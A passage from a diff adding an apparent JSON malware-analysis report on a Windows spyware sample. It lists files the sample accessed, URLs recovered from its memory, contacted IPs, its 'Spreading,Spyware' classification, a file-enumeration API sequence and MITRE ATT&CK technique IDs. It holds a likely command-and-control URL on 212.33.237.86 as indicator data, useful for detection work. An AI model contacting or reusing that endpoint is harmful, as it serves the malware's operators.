+				"path": "C:\\ProgramData\\Adobe\\Setup\\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\\setup.exe-"
+			},
+			{
+				"path": "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe"
+			},
+			{
+				"path": "C:\\Windows\\Fonts\\StaticCache.dat"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Temp\\~DF705C9746CD951EEE.TMP"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery\\High\\Active\\RecoveryStore.{C32C3E89-28A5-11ED-AAE5-34735AA02029}.dat"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Temp\\~DFC7D3A6AD7FD3C024.TMP"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\Recovery\\High\\Active\\{C32C3E8B-28A5-11ED-AAE5-34735AA02029}.dat"
+			},
+			{
+				"path": "C:\\Users\\desktop.ini"
+			},
+			{
+				"path": "C:\\Users\\user\\Favorites\\desktop.ini"
+			},
+			{
+				"path": "C:\\Users\\user\\Desktop\\desktop.ini"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Local\\Microsoft\\Internet Explorer\\imagestore\\0ci18hh\\imagestore.dat"
+			},
+			{
+				"path": "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\OKAZJZSS.txt"
+			},
+			{
+				"path": "C:\\Program Files\\Microsoft Office 15\\root\\office15\\urlredir.dll"
+			},
+			{
+				"path": "C:\\Windows\\SysWOW64\\ieframe.dll"
+			},
+			{
+				"path": "C:\\Windows\\System32\\drivers\\etc\\hosts"
+			},
+			{
+				"path": "C:\\Windows\\SysWOW64\\stdole2.tlb"
+			}
+		],
+		"MutexName(CreateMutexA)": [],
+		"URL(Contacted URL)": [],
+		"URL(from Memory and Binaries)": [
+			{
+				"url": "http://212.33.237.86/images/1/report.php",
+				"registrar": "",
+				"registrant": "",
+				"email": "",
+				"updated_date": "",
+				"creation_date": "",
+				"expiration_date": "",
+				"country": ""
+			},
+			{
+				"url": "http://212.33.237.86/images/1/report.phpRoot",
+				"registrar": "",
+				"registrant": "",
+				"email": "",
+				"updated_date": "",
+				"creation_date": "",
+				"expiration_date": "",
+				"country": ""
+			},
+			{
+				"url": "http://translationproject.org/team/",
+				"registrar": "",
+				"registrant": "",
+				"email": "",
+				"updated_date": "",
+				"creation_date": "",
+				"expiration_date": "",
+				"country": ""
+			},
+			{
+				"url": "http://www.gnu.org/software/coreutils/",
+				"registrar": "",
+				"registrant": "",
+				"email": "",
+				"updated_date": "",
+				"creation_date": "",
+				"expiration_date": "",
+				"country": ""
+			},
+			{
+				"url": "http://gnu.org/licenses/gpl.html",
+				"registrar": "",
+				"registrant": "",
+				"email": "",
+				"updated_date": "",
+				"creation_date": "",
+				"expiration_date": "",
+				"country": ""
+			},
+			{
+				"url": "http://www.gnu.org/software/coreutils/GNU",
+				"registrar": "",
+				"registrant": "",
+				"email": "",
+				"updated_date": "",
+				"creation_date": "",
+				"expiration_date": "",
+				"country": ""
+			},
+			{
+				"url": "http://svn.red-bean.com/bob/macholib/trunk/macholib/",
+				"registrar": "",
+				"registrant": "",
+				"email": "",
+				"updated_date": "",
+				"creation_date": "",
+				"expiration_date": "",
+				"country": ""
+			},
+			{
+				"url": "http://www.gnu.org/gethelp/",
+				"registrar": "",
+				"registrant": "",
+				"email": "",
+				"updated_date": "",
+				"creation_date": "",
+				"expiration_date": "",
+				"country": ""
+			}
+		],
+		"IP(Contacted IP)": [
+			{
+				"ip": "212.33.237.86",
+				"country": "RU"
+			},
+			{
+				"ip": "192.168.50.29",
+				"country": ""
+			}
+		],
+		"Classification": "Spreading,Spyware",
+		"Digitally signed name": "",
+		"Digitally signed S/N": "",
+		"Trid(Antivirus detection name)": "Win32 Executable (generic) a (10002005/4)",
+		"API Sequence": "FindFirstFileA_FindNextFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindNextFileA_FindNextFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA_FindFirstFileA",
+		"ATT&CK(Initial Access)": "",
+		"ATT&CK(Execution)": "T1059",
+		"ATT&CK(Persistence)": "",
+		"ATT&CK(Privilege Escalation)": "T1055",
+		"ATT&CK(Defense Evasion)": "T1036,T1055,T1027",
+		"ATT&CK(Credential Access)": "",
+		"ATT&CK(Discovery)": "T1057,T1083,T1082",
+		"ATT&CK(Lateral Movement)": "T1080",
+		"ATT&CK(Collection)": "T1005",
+		"ATT&CK(Exfiltration)": "",
+		"ATT&CK(Command and Control)": "T1105"
+	}
+}
